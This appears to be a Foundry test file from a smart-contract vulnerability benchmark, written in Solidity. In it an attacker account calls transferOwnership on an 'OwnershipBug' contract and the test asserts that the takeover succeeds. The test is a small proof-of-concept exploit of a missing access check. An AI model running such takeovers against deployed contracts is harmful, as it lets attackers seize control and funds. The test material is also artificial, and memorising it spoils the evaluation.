// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
import "./basetest.sol";
import "../src/da51b355-8ab8-447c-9497-f80be5933694_OwnershipBug.sol";

contract OwnershipBugTest is BaseTestWithBalanceLog {
    address attacker = address(0xBAD);
    OwnershipBug target;

    function setUp() public {
        target = new OwnershipBug();
    
        vm.deal(attacker, 10 ether);
    }

    function testExploit() public balanceLog {
        vm.startPrank(attacker); // Start prank with the attacker's account
        target.transferOwnership(address(0x1234567890123456789012345678901234567890)); // Change owner to a test address
        vm.stopPrank();

        // Validate that the ownership has changed
        assertEq(target.owner(), address(0x1234567890123456789012345678901234567890));
    }
}